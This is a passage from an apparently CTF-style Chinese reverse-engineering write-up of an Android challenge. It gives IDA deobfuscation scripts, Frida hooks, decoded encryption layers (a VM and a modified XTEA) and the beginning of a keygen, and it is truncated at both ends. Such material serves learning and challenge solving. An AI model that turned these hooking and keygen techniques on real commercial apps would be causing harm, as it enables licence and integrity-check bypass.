print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break elif idc.print_insn_mnem(temp_addr) == \"MOVK\": # 形如 MOV W9, #0x76BC;MOVK W9, #0x4C48,LSL#16; 的形式 if idc.print_operand(temp_addr, 0)[1::] in add_reg: # print(hex(add_val)) add_val = (idc.get_operand_value(temp_addr, 1) &lt;&lt; 16) # print(hex(add_val)) while temp_addr > text_seg.start_ea: if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val += idc.get_operand_value(temp_addr, 1) # print(hex(add_val)) break temp_addr = idc.prev_head(temp_addr) break temp_addr = idc.prev_head(temp_addr) # print(hex(current_addr)) # 计算出分支跳转的两个位置 branch_a = (ida_bytes.get_qword(jump_array_addr + (1 &lt;&lt; Lshift_val)) + add_val) &amp; 0xffffffffffffffff branch_b = (ida_bytes.get_qword(jump_array_addr + (0 &lt;&lt; Lshift_val)) + add_val) &amp; 0xffffffffffffffff # print(hex(branch_a), hex(branch_b)) # print(CSEL_cond,hex(current_addr)) # GE&lt;->LT 有符号大于等于 vs 有符号小于 # EQ&lt;->NE 结果相等 vs 结果不相等 # CC&lt;->CS 无符号小于 vs 无符号大于等于 # HI&lt;->LS 无符号大于 vs 无符号小于等于 # if CSEL_cond == \"GE\":# 构造 B.LT 跳转 logic_rev = &#123;\"GE\": \"LT\", \"LT\": \"GE\", \"EQ\": \"NE\", \"NE\": \"EQ\", \"CC\": \"CS\", \"CS\": \"CC\", \"HI\": \"LS\", \"LS\": \"HI\"&#125; ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) code = \"\" if branch_b == idc.next_head(BR_addr): # 判断逻辑不取反 code = f\"B.&#123;CSET_cond&#125; #&#123;hex(branch_a)&#125;\" elif branch_a == idc.next_head(BR_addr): # 判断逻辑取反 code = f\"B.&#123;logic_rev[CSET_cond]&#125; #&#123;hex(branch_b)&#125;\" # print(hex(current_addr),add_reg,hex(add_val),CSET_op1,CSET_op1_val,jump_array_reg,hex(jump_array_addr),Lshift_val,code) # 修复 BR 跳转 if code != \"\": patch_br_byte, count = ks.asm(code, addr=BR_addr) ida_bytes.patch_bytes(BR_addr, bytes(patch_br_byte)) print(f\"fix CSET-BR at &#123;hex(BR_addr)&#125;\") nop_addr_array_after_finish.extend(nop_addr_array_temp) current_addr = idc.next_head(BR_addr) continue else: print(f\"error! unable to fix CSET-BR at &#123;hex(current_addr)&#125;,branch:&#123;hex(branch_a)&#125;, &#123;hex(branch_b)&#125;\") current_addr = idc.next_head(current_addr)for addr in nop_addr_array_after_finish: patch_nop(addr, addr + idc.get_item_size(addr))# 加密一 在 sub_3B9D4 中 __int64 __fastcall sub_3B9D4(__int64 result)&#123; unsigned __int64 i; // x8 __int64 v2; // x10 int v3; // w11 __int64 v4; // x11 int v5; // w10 int v6; // w12 unsigned __int8 v7; // w14 int v8; // [xsp+Ch] [xbp-4h] for ( i = 0LL; i &lt; 2; ++i ) &#123; v2 = 3LL; v8 = 0; v3 = 24; do &#123; *((_BYTE *)&amp;v8 + v2) = (*(_DWORD *)(result + 4 * i) >> v3) ^ v2; --v2; v3 -= 8; &#125; while ( v2 >= 0 ); HIBYTE(v8) ^= 0x86u; BYTE2(v8) -= 94; v4 = 3LL; BYTE1(v8) ^= 0xD3u; LOBYTE(v8) = v8 - 28; *(_DWORD *)(result + 4 * i) = 0; v5 = 0; v6 = 24; do &#123; v7 = *((_BYTE *)&amp;v8 + v4) - v6; *((_BYTE *)&amp;v8 + v4--) = v7; v5 += v7 &lt;&lt; v6; *(_DWORD *)(result + 4 * i) = v5; v6 -= 8; &#125; while ( v4 >= 0 ); &#125; return result;&#125;第一个加密函数 sub_3B9D4 取出数据的每一位进行加密，其中出现的 HIBYTE , BYTE2 , BYTE1 , LOBYTE 含义如下，假设有数据 a1=0x12345678 , 则 符号 取出的值 HIBYTE(a1) 0x12 BYTE2(a1) 0x34 BYTE1(a1) 0x56 LOBYTE(a1) 0x78 我们可以使用 frida 去 hook sub_3B9D4 传入的值以及返回值，观察加密前后的变化，假设我此处在小键盘输入的数字是 999999999999 , hex(999999999999)=0xe8d4a50fff //hook 第一个加密函数，观察数值前后变化function hook_1_enc()&#123;// 获取模块 var module = Process.getModuleByName(\"libsec2023.so\") // 转为函数地址 var addr=module.base.add(\"0x3B9D4\"); // 获取函数入口 var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // 函数 hook 钩子附加 Interceptor.attach(func, &#123; onEnter: function (args) &#123; console.log('before first enc'); console.log(hexdump(args[0],&#123; offset: 0,// 相对偏移 length: 64,//dump 的大小 header: true, ansi: true &#125;)); &#125;, onLeave: function (retval) &#123; console.log(\"after first enc\") console.log(hexdump(retval,&#123; offset: 0,// 相对偏移 length: 64,//dump 的大小 header: true, ansi: true &#125;)); &#125; &#125;);&#125; 于是第一个算法如下 algorithm_1 = &#123; (0, \"enc\"): lambda x: (x - 28) &amp; 0xff, (1, \"enc\"): lambda x: x ^ 0xd3, (2, \"enc\"): lambda x: (x - 94) &amp; 0xff, (3, \"enc\"): lambda x: x ^ 0x86, (0, \"dec\"): lambda x: (x + 28) &amp; 0xff, (1, \"dec\"): lambda x: x ^ 0xd3, (2, \"dec\"): lambda x: (x + 94) &amp; 0xff, (3, \"dec\"): lambda x: x ^ 0x86&#125;def enc_1(input): input_byte = bytearray(input.to_bytes(8, 'little')) for i in range(len(input_byte)): index = i % 4 input_byte[i] = (algorithm_1[(index, \"enc\")](input_byte[i] ^ index) - 8 * index) &amp; 0xff return int.from_bytes(input_byte, 'little')def dec_1(input): input_byte = bytearray(input.to_bytes(8, 'little')) for i in range(len(input_byte)): index = i % 4 input_byte[i] = (algorithm_1[(index, \"dec\")]((input_byte[i] + 8 * index) &amp; 0xff)) ^ index return int.from_bytes(input_byte, 'little')def mytest_1(): input = 999999999999 # 假设在小键盘输入 999999999999 # 验证加密算法 input = enc_1(input) assert input.to_bytes(8, 'little') == b'\\xe3\\xd5\\x39\\x39\\xcc\\xca\\x94\\x6d' # 验证解密算法 input = dec_1(input) assert input.to_bytes(8, 'little') == b'\\xff\\x0f\\xa5\\xd4\\xe8\\x00\\x00\\x00'mytest_1()# 在 sub_3B9D4 之后 bswap32 分析 在对输入的值进行首轮加密之后，又再次对输入值经过 bswap32 函数加密 这个函数对应的 arm 汇编为 REV W8, W8那我们去 arm 手册看看 REV 指令的定义好了 REV Byte-Reverse Word reverses the byte order in a 32-bit register. Operation if ConditionPassed() then EncodingSpecificOperations(); bits(32) result; result&lt;31:24> = R[m]&lt;7:0>; result&lt;23:16> = R[m]&lt;15:8>; result&lt;15:8> = R[m]&lt;23:16>; result&lt;7:0> = R[m]&lt;31:24>; R[d] = result; 看 Operation 很清楚的知道这就是反转字节，比如 w8 = 0x12345678;REV W8, W8;w8;//w8 = 0x78563412所以此处 bswap32(v6) , 是对 v6 进行字节翻转，而 v6 = HIDWORD(a1) , 故在进行第一个加密函数 sub_3B9D4 之后，将首先对输入的高 32 位进行加密处理，这在我们后续 hook 第二个加密函数 sub_3A924 之后，也可以体现出来这一点 # 加密二 BlackObfuscator 混淆 我们首先 hook 一下 sub_3A924 让前后分析的逻辑连贯起来 //hook 第 2 个加密函数，观察数值前后变化var enc2_count = 0;var input_2 = [0,0]function hook_2_enc()&#123;// 获取模块 var module = Process.getModuleByName(\"libsec2023.so\") // 转为函数地址 var addr=module.base.add(\"0x3A924\"); // 获取函数入口 var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // 函数 hook 钩子附加 Interceptor.attach(func, &#123; onEnter: function (args) &#123; console.log('before second enc, count:',enc2_count+1); input_2[enc2_count] = args[3] console.log(hexdump(args[1],&#123; offset: 0,// 相对偏移 length: 64,//dump 的大小 header: true, ansi: true &#125;)); &#125;, onLeave: function (retval) &#123; console.log('after second enc, count:',enc2_count+1); console.log(hexdump(input_2[enc2_count],&#123; offset: 0,// 相对偏移 length: 64,//dump 的大小 header: true, ansi: true &#125;)); enc2_count+=1; &#125; &#125; );&#125;在经过第一轮加密后，我们得到了密文 cc ca 94 6d e3 d5 39 39 , 而在此处，第一次调用 sub_3A924 的输入为 6d 94 ca cc , 第二次调用 sub_3A924 的输入为 39 39 d5 e3 , 正好对应了上文提到的翻转字节处理 我们进入该函数后，发现如 v11+1408LL , v11 + 1664LL 等等的 fastcall 函数调用，一般这种形式的函数调用在安卓逆向中遇到的话，那大概率就是 JNIEnv * 在此题中，我们只需要对 v11 按下 Y 切换类型，然后输入 JNIEnv * , 就会转换成 JNIEnv * 的结构体函数指针如图 在这里出现了 jni 函数 GetStaticMethodID , 我们 hook 一下这个函数观察调用了什么方法 //hook GetStaticMethodID function hook_GetStaticMethodID() &#123; var symbols = Module.enumerateSymbolsSync(\"libart.so\"); var addr_jni = null; for (var i = 0; i &lt; symbols.length; i++) &#123; var symbol = symbols[i]; if (symbol.name.indexOf(\"GetStaticMethodID\")!=-1) &#123; addr_jni = symbol.address; console.log(\"find \",symbol.name); console.log(\"[+] hook \",addr_jni); Interceptor.attach(addr_jni, &#123; onEnter: function (args) &#123; console.log(\"call GetStaticMethodID: \",symbol.name); console.log(\"name: \",args[2].readCString()); console.log(\"sig: \",args[3].readCString()); &#125;, onLeave: function (retval) &#123; //console.log(\"return val\") //console.log(retval); &#125; &#125;); &#125; &#125;&#125;在输出中，我们发现 GetStaticMethodID 调用了名为 encrypt 的方法 但是我们在 apk 中却并未发现该方法 那么由此就可以推断出这个方法是由 dex 动态加载的 我们可以使用 frida-dexdump 来把内存中的 dex 给 dump 下来，要注意 frida 的端口已经被我们修改为了 1234 , 所以这里也要加上 -H 参数 将所有 dex dump 下来之后，接下来的步骤就是把这些 dex 一个一个拖进 jadx 里面反编译，去看看哪一个 dex 包含 encrypt 方法 这个控制流一眼看上去就是加了混淆的，据 FallW1nd 师傅说是 BlackObfuscator 混淆，本来准备去手工分析的，但是想起前几天刚下载了 Jeb5.1, 就想看看新工具的效果怎样 当我用 Jeb5.1 反编译这个 dex 之后，这 BlackObfuscator 混淆怎么就直接去除了？？？ 好家伙这 Jeb5.1 竟然能自动去除控制流平坦化，crazy! 那么这第二个加密的逻辑相当的清晰，算法如下 import structdef enc_2(input): input = int.from_bytes(input.to_bytes(4, 'little'), 'big') # 字节再次翻转 input = (input >> 7 | input &lt;&lt; 25) &amp; 0xffffffff input_byte = bytearray(input.to_bytes(4, 'big')) xor_arr = [50, -51, -1, -104, 25, -78, 0x7C, -102] for i in range(4): input_byte[i] = (input_byte[i] ^ xor_arr[i]) &amp; 0xff input_byte[i] = (input_byte[i] + i) &amp; 0xff return int.from_bytes(input_byte, 'big')def dec_2(input): input_byte = bytearray(input.to_bytes(4, 'big')) xor_arr = [50, -51, -1, -104, 25, -78, 0x7C, -102] for i in range(4): input_byte[i] = (input_byte[i] - i) &amp; 0xff input_byte[i] = (input_byte[i] ^ xor_arr[i]) &amp; 0xff input = int.from_bytes(input_byte, 'big') input = (input &lt;&lt; 7 | input >> 25) &amp; 0xffffffff input = int.from_bytes(input.to_bytes(4, 'little'), 'big') # 字节再次翻转 return inputdef mytest_2(): input = int.from_bytes(b'\\xe3\\xd5\\x39\\x39\\xcc\\xca\\x94\\x6d','little') input_low, input_high = struct.unpack('>2I', input.to_bytes(8, 'little')) # 实现 bswap32 # 验证加密算法 input_high = enc_2(input_high) assert input_high.to_bytes(4, 'big') == b'\\xaa\\x17\\xd8\\x10' input_low = enc_2(input_low) assert input_low.to_bytes(4, 'big') == b'\\xf4\\xc0\\x8e\\x36' # 验证解密算法 input_high = dec_2(input_high) input_low = dec_2(input_low) input = struct.pack('>2I', input_low, input_high) assert input == b'\\xe3\\xd5\\x39\\x39\\xcc\\xca\\x94\\x6d'mytest_2()# 总览第二处加密 sub_3B8CC 我们可以 hook 一下第二次加密前后输入的变化 //hook sub_3B8CC, 观察传入的参数function hook_3B8CC()&#123; // 获取模块 var module = Process.getModuleByName(\"libsec2023.so\") // 转为函数地址 var addr=module.base.add(\"0x3B8CC\"); // 获取函数入口 var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // 函数 hook 钩子附加 Interceptor.attach(func, &#123; onEnter: function (args) &#123; console.log(\"\\nbefore sub_3B8CC: \",args[0]); &#125;, onLeave: function (retval) &#123; console.log(\"after sub_3B8CC: \",retval); &#125; &#125;);&#125; # 回到 libil2cpp.so 中 我们在 sub_31164 中去 hook 最后的 br x2 跳转来观察之后跳转到了哪一个函数中 function addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); console.log(addr); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; // 包含 \"lib\" 字符串的 if(process_Obj_Module_Arr[i].path.indexOf(\"lib\")!=-1) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; console.log(addr.toString(16),\"位于\",process_Obj_Module_Arr[i].name,\"中\",\"offset: \",(addr-process_Obj_Module_Arr[i].base).toString(16)); &#125; &#125; &#125;&#125;//hook sub_311A0, 查看 BR X2 跳转的地址function hook_311A0()&#123; // 获取模块 var module = Process.getModuleByName(\"libsec2023.so\") // 转为函数地址 var addr=module.base.add(\"0x311A0\"); // 获取函数入口 var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // 函数 hook 钩子附加 Interceptor.attach(func, &#123; onEnter: function (args) &#123; addr_in_so(this.context.x2); &#125;, onLeave: function (retval) &#123; //console.log(hexdump(retval)); &#125; &#125;);&#125;可见在 libsec2023.so 中经过两次加密之后，apk 回到了 libil2cpp.so 中 # 分析 libil2cpp.so 偏移为 0x138d64 处 偏移 0x138d64 加上原来 so 的基址后，定位到了这个地方 B 跳转过去发现并不是一个函数，而是 FUNCTION CHUNK 那先修改一下 .init_proc 的 End address 然后回到之前 chunk function 的位置，按下 P 让 IDA 分析出函数，就可以看伪代码继续分析了 # 加密三 vm 指令分析 这个类的名称被 o , O , 0 给混淆了，导致难以分辨类和变量，所以需要为这些类和变量进行重命名 在看看其他函数，这最后的 v6 + v8 + (v6 | ~v8) + (v8 ^ v6) - (v6 &amp; ~v8) + 1 看起来是 MBA 表达式 在 github 找个工具 GAMBA 简化一下，有些表达式要分开简化效果才好，这里 4294967296=0x100000000 已经溢出 32 位了，所以 4294967296+v8=v8 重命名函数之后，很明显发现这个加密算法应该和 VM 指令相关 我们回到类的初始化函数 ctor 完成之后，下一个要调用的函数 OO0OoOOo_Oo0__oOOoO0o0 进入该函数，又是经典的 while(1) 循环，那么在这个循环里面，必定会出现 eip 和 opcode , 这两个分别对应着 this-&gt;fields.oOOO0Oo0 和 U16_arr , 我们重命名之 之后，我们以 add 函数为例分析其他全局变量的含义，这里对应的 vm 指令应该为 add uS_arr[bbb], uS_arr[bbb], uS_arr[bbb+1] 到这里可能会有人纠结 uS_arr 究竟代表寄存器还是代表栈呢？我们回到初始化函数中，发现变量 bbb 所赋的初值为 -1 , 那么由此可以确定， uS_arr 代表的是栈，而 bbb 则表示 esp 至此为止，vm 所需的关键变量我们均已经分析清楚了 接下来就可以分析 vm 虚拟机了，对于 vm 类题型，我们只需要找到 vm 指令中的加减乘除位运算的位置和输入输出是多少就够了，别的指令比如 push , pop , mov ,opcode 是多少，opcode 是如何被 vm 读取等等这些问题都不需要考虑，因为在 vm 中，所有的 vm 指令的最终目的都是为了对输入的值进行操作，我们知道了这些加密运算，那么逆运算自然是信手拈来 所以在这里，我们可以用 frida 去 hook 一下运算相关的指令 //hook vmfunction hook_vm()&#123; var module = Process.getModuleByName(\"libil2cpp.so\") var my_base = 0x712a997000; var esp,ptr_esp,eip,ptr_eip,opcode,input,stack; var addr_run=module.base.add(0x712AE01D44-my_base); Interceptor.attach(addr_run, &#123; onEnter: function (args) &#123; opcode = ptr(args[0].add(0x10).readS64()).add(0x20); input = ptr(args[0].add(0x18).readS64()).add(0x1c); stack = ptr(args[0].add(0x20).readS64()).add(0x1c); ptr_esp = args[0].add(0x28); ptr_eip = args[0].add(0x2c); console.log(\"====start vm====\"); for(var i=1;i&lt;8;i++)&#123; console.log(\"input[\"+i+\"]=0x\"+input.add(4*i).readS32().toString(16)); &#125; &#125;, onLeave: function (retval) &#123; console.log(\"====end vm====\") &#125; &#125;); var addr_add=module.base.add(0x712AE01E50-my_base); Interceptor.attach(addr_add, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\"+\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;); var addr_sub=module.base.add(0x712AE01ECC-my_base); Interceptor.attach(addr_sub, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\"-\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;); var addr_mul=module.base.add(0x712AE01F44-my_base); Interceptor.attach(addr_mul, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\"*\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;); var addr_Lshift=module.base.add(0x712AE01FC4-my_base); Interceptor.attach(addr_Lshift, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\"&lt;&lt;\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;); var addr_Rshift=module.base.add(0x712AE02040-my_base); Interceptor.attach(addr_Rshift, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\">>\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;); var addr_and=module.base.add(0x712AE020BC-my_base); Interceptor.attach(addr_and, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\"&amp;\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;); var addr_xor=module.base.add(0x712AE0213C-my_base); Interceptor.attach(addr_xor, &#123; onEnter: function (args) &#123; esp=ptr_esp.readS32(); eip=ptr_eip.readS32(); console.log(\"stack[\"+esp+\"]=0x\"+stack.add(4*esp).readS32().toString(16)+\"^\"+stack.add(4*(esp+1)).readS32()); &#125;, onLeave: function (retval) &#123; &#125; &#125;);&#125;输出以及分析如下 ====start vm====input[1]=0x10d817aa// 输入的低 32 位input[2]=0x368ec0f4// 输入的高 32 位// 低 32 位进行 vm 加密stack[1]=0x10d817aa>>24stack[1]=0x10&amp;255// 取出第 4 个字节，即 0x10, 方便起见，记为 byte4stack[2]=0x18-8stack[2]=0x10d817aa>>16stack[2]=0x10d8&amp;255// 取出第 3 个字节，即 0xd8, 记为 byte3stack[3]=0x10-8stack[3]=0x10d817aa>>8stack[3]=0x10d817&amp;255// 取出第 2 个字节，即 0x17, 记为 byte2stack[4]=0x8-8stack[4]=0x10d817aa>>0stack[4]=0x10d817aa&amp;255// 取出第 1 个字节，即 0xaa, 记为 byte1stack[5]=0x0-8stack[4]=0xaa-27//byte1=byte1-27=0x8fstack[3]=0x17^194//byte2=byte2^194=0xd5stack[2]=0xd8+168//byte3=byte3+168=0x180stack[1]=0x10^54//byte4=byte4^54=0x26stack[1]=0x8f^0//byte1^0stack[1]=0x8f&lt;&lt;0//byte1&lt;&lt;0stack[2]=0xff&lt;&lt;0stack[1]=0x8f&amp;255stack[1]=0x8f+0stack[1]=0x4+1stack[1]=0x0+8stack[1]=0xd5^8//byte2^8stack[1]=0xdd&lt;&lt;8//byte2&lt;&lt;8stack[2]=0xff&lt;&lt;8stack[1]=0xdd00&amp;65280stack[1]=0xdd00+143stack[1]=0x5+1stack[1]=0x8+8stack[1]=0x180^16//byte3^16stack[1]=0x190&lt;&lt;16//byte3&lt;&lt;16stack[2]=0xff&lt;&lt;16stack[1]=0x1900000&amp;16711680stack[1]=0x900000+56719stack[1]=0x6+1stack[1]=0x10+8stack[1]=0x26^24//byte4^24stack[1]=0x3e&lt;&lt;24//byte4&lt;&lt;24stack[2]=0xff&lt;&lt;24stack[1]=0x3e000000&amp;-16777216stack[1]=0x3e000000+9493903// 高 32 位进行 vm 加密stack[1]=0x7+1stack[1]=0x18+8stack[1]=0x368ec0f4>>24// 取出第 4 个字节，即 0x36, 记为 byte4stack[1]=0x36&amp;255stack[2]=0x18-8stack[2]=0x368ec0f4>>16// 取出第 3 个字节，即 0x8e, 记为 byte3stack[2]=0x368e&amp;255stack[3]=0x10-8stack[3]=0x368ec0f4>>8// 取出第 2 个字节，即 0xc0, 记为 byte2stack[3]=0x368ec0&amp;255stack[4]=0x8-8stack[4]=0x368ec0f4>>0// 取出第 1 个字节，即 0xf4, 记为 byte1stack[4]=0x368ec0f4&amp;255stack[5]=0x0-8stack[4]=0xf4-47//byte1=byte1-47=0xc5stack[3]=0xc0^182//byte2=byte2^182=0x76stack[2]=0x8e+55//byte3=byte3+55=0xc5stack[1]=0x36^152//byte4=byte4^152=0xaestack[1]=0xc5+0//byte1+0stack[1]=0xc5&lt;&lt;0//byte1&lt;&lt;0stack[2]=0xff&lt;&lt;0stack[1]=0xc5&amp;255stack[1]=0xc5+0stack[1]=0x4+1stack[1]=0x0+8stack[1]=0x76+8//byte2+8stack[1]=0x7e&lt;&lt;8//byte2&lt;&lt;8stack[2]=0xff&lt;&lt;8stack[1]=0x7e00&amp;65280stack[1]=0x7e00+197stack[1]=0x5+1stack[1]=0x8+8stack[1]=0xc5+16//byte3+16stack[1]=0xd5&lt;&lt;16//byte3&lt;&lt;16stack[2]=0xff&lt;&lt;16stack[1]=0xd50000&amp;16711680stack[1]=0xd50000+32453stack[1]=0x6+1stack[1]=0x10+8stack[1]=0xae+24//byte4+24stack[1]=0xc6&lt;&lt;24//byte&lt;&lt;24stack[2]=0xff&lt;&lt;24stack[1]=0x-3a000000&amp;-16777216stack[1]=0x-3a000000+13991621stack[1]=0x7+1stack[1]=0x18+8====end vm====input[1]=0x3e90dd8finput[2]=0x-392a813b// 无符号 int 对应的是 0xc6d57ec5由此可见，这个 vm 其实相当的简单 import structdef enc_vm_low(input): byte4, byte3, byte2, byte1 = struct.unpack(\">4B\", input.to_bytes(4, 'big')) byte1 = (byte1 - 27) ^ 0 byte2 = (byte2 ^ 194) ^ 8 byte3 = (byte3 + 168) ^ 16 byte4 = (byte4 ^ 54) ^ 24 input = struct.pack(\">4B\", byte1 &amp; 0xff, byte2 &amp; 0xff, byte3 &amp; 0xff, byte4 &amp; 0xff) return int.from_bytes(input, 'little')def dec_vm_low(input): byte4, byte3, byte2, byte1 = struct.unpack(\">4B\", input.to_bytes(4, 'big')) byte1 = (byte1 ^ 0) + 27 byte2 = (byte2 ^ 8) ^ 194 byte3 = (byte3 ^ 16) - 168 byte4 = (byte4 ^ 24) ^ 54 input = struct.pack(\">4B\", byte1 &amp; 0xff, byte2 &amp; 0xff, byte3 &amp; 0xff, byte4 &amp; 0xff) return int.from_bytes(input, 'little')def enc_vm_high(input): byte4, byte3, byte2, byte1 = struct.unpack(\">4B\", input.to_bytes(4, 'big')) byte1 = (byte1 - 47) + 0 byte2 = (byte2 ^ 182) + 8 byte3 = (byte3 + 55) + 16 byte4 = (byte4 ^ 152) + 24 input = struct.pack(\">4B\", byte1 &amp; 0xff, byte2 &amp; 0xff, byte3 &amp; 0xff, byte4 &amp; 0xff) return int.from_bytes(input, 'little')def dec_vm_high(input): byte4, byte3, byte2, byte1 = struct.unpack(\">4B\", input.to_bytes(4, 'big')) byte1 = (byte1 - 0) + 47 byte2 = (byte2 - 8) ^ 182 byte3 = (byte3 - 16) - 55 byte4 = (byte4 - 24) ^ 152 input = struct.pack(\">4B\", byte1 &amp; 0xff, byte2 &amp; 0xff, byte3 &amp; 0xff, byte4 &amp; 0xff) return int.from_bytes(input, 'little')def mytest_3(): input_high = int.from_bytes(b'\\xaa\\x17\\xd8\\x10','big') input_low = int.from_bytes(b'\\xf4\\xc0\\x8e\\x36','big') input_high, input_low = input_low, input_high # 对应 sub_3B8CC 最后 输入的高 / 低 32 位交换 input = struct.pack('>2I', input_low, input_high) # 验证加密算法 input_low, input_high = struct.unpack('&lt;2I', input) input_low = enc_vm_low(input_low) assert input_low == 0x3e90dd8f input_high = enc_vm_high(input_high) assert input_high == 0xc6d57ec5 # 验证解密算法 input_low = dec_vm_low(input_low) assert input_low == 0x10d817aa input_high = dec_vm_high(input_high) assert input_high == 0x368ec0f4mytest_3()# 加密四 xtea 分析 这个算法一看就知道是 xtea, 那么需要知道的就只有 v24 这个密钥了 用 frida 把密钥 hook 下来 //hook xtea 加密的 keyfunction hook_xtea_key()&#123; // 获取模块 var module = Process.getModuleByName(\"libil2cpp.so\"); var my_base = 0x712a997000; var addr_key=module.base.add(0x712ADFCC60-my_base); // 函数 hook 钩子附加 Interceptor.attach(addr_key, &#123; onEnter: function (args) &#123; console.log(hexdump(this.context.x20,&#123; offset: 0,// 相对偏移 length: 64,//dump 的大小 header: true, ansi: true &#125;)); &#125;, onLeave: function (retval) &#123; &#125; &#125;);&#125; 再把 xtea 加密之后的值也顺便 hook 下来 //hook 所有加密完成之后的值，以及比较的值function hook_final_check()&#123; // 获取模块 var module = Process.getModuleByName(\"libil2cpp.so\"); var my_base = 0x712a997000; var addr_final_check=module.base.add(0x712ADFCD14-my_base); // 函数 hook 钩子附加 Interceptor.attach(addr_final_check, &#123; onEnter: function (args) &#123; console.log(\"result = \",this.context.x0); console.log(\"result_low = \",this.context.x21); console.log(\"result_high = \",this.context.x22); &#125;, onLeave: function (retval) &#123; &#125; &#125;);&#125; 那么这部分的算法如下 import ctypesdef enc_xtea(input_low, input_high): v0, v1 = ctypes.c_uint32(input_low), ctypes.c_uint32(input_high) key = [0x7b777c63, 0xc56f6bf2, 0x2b670130, 0x76abd7fe] delta = 0x21524111 total1 = ctypes.c_uint32(0xBEEFBEEF) total2 = ctypes.c_uint32(0x9D9D7DDE) for i in range(64): v0.value += (((v1.value &lt;&lt; 7) ^ (v1.value >> 8)) + v1.value) ^ (total1.value - key[total1.value &amp; 3]) v1.value += (((v0.value &lt;&lt; 8) ^ (v0.value >> 7)) - v0.value) ^ (total2.value + key[(total2.value >> 13) &amp; 3]) total1.value -= delta total2.value -= delta return v0.value, v1.valuedef dec_xtea(input_low, input_high): v0, v1 = ctypes.c_uint32(input_low), ctypes.c_uint32(input_high) key = [0x7b777c63, 0xc56f6bf2, 0x2b670130, 0x76abd7fe] delta = 0x21524111 total1 = ctypes.c_uint32(0xBEEFBEEF - 64 * delta) total2 = ctypes.c_uint32(0x9D9D7DDE - 64 * delta) for i in range(64): total1.value += delta total2.value += delta v1.value -= (((v0.value &lt;&lt; 8) ^ (v0.value >> 7)) - v0.value) ^ (total2.value + key[(total2.value >> 13) &amp; 3]) v0.value -= (((v1.value &lt;&lt; 7) ^ (v1.value >> 8)) + v1.value) ^ (total1.value - key[total1.value &amp; 3]) return v0.value, v1.valuedef mytest_4(): input_low = 0x3e90dd8f input_high = 0xc6d57ec5 # 验证加密算法 input_low, input_high = enc_xtea(input_low, input_high) assert (input_low, input_high) == (0xabba3c01, 0x7223607f) # 验证解密算法 input_low, input_high = dec_xtea(input_low, input_high) assert (input_low, input_high) == (0x3e90dd8f, 0xc6d57ec5)mytest_4()至此为止，所有加密算法分析完毕 # 注册机 在所有的加密完成后，这里的 result 就是我们的 token , 加密的低 32 位和 token 比较，高 32 位和 0 比较 import structimport ctypesalgorithm_1 = &#123; (0, \"dec\"): lambda x: (x + 28) &amp; 0xff, (1, \"dec\"): lambda x: x ^ 0xd3, (2, \"dec\"): lambda x: (x + 94) &amp; 0xff, (3, \"dec\"): lambda x: x ^ 0x86&#125;def dec_xtea(input_low, input_high): v0, v1 = ctypes.c_uint32(input_low), ctypes.c_uint32(input_high) key = [0x7b777c63, 0xc56f6bf2, 0x2b670130, 0x76abd7fe] delta = 0x21524111 total1 = ctypes.c_uint32(0xBEEFBEEF-64*delta) total2 = ctypes.c_uint32(0x9D9D7DDE-64*delta) for i in range(64): total1.value += delta total2.value += delta v1.value -= (((v0.value &lt;&lt; 8) ^ (v0.value >> 7)) - v0.value) ^ (total2.value + key[(total2.value >> 13) &amp; 3]) v0.value -= (((v1.value &lt;&lt; 7) ^ (v1.value >> 8)) + v1.value) ^ (total1.value - key[total1.value &amp; 3]) return v0.value, v1.valuedef dec_vm_low(input): byte4, byte3, byte2, byte1 = struct.unpack(\">4B\", input.to_bytes(4, 'big')) byte1 = (byte1 ^ 0) + 27 byte2 = (byte2 ^ 8) ^ 194 byte3 = (byte3 ^ 16) - 168 byte4 = (byte4 ^ 24) ^ 54 input = struct.pack(\">4B\", byte1 &amp; 0xff, byte2 &amp; 0xff, byte3 &amp; 0xff, byte4 &amp; 0xff) return int.from_bytes(input, 'little')def dec_vm_high(input): byte4, byte3, byte2, byte1 = struct.unpack(\">4B\", input.to_bytes(4, 'big')) byte1 = (byte1 - 0) + 47 byte2 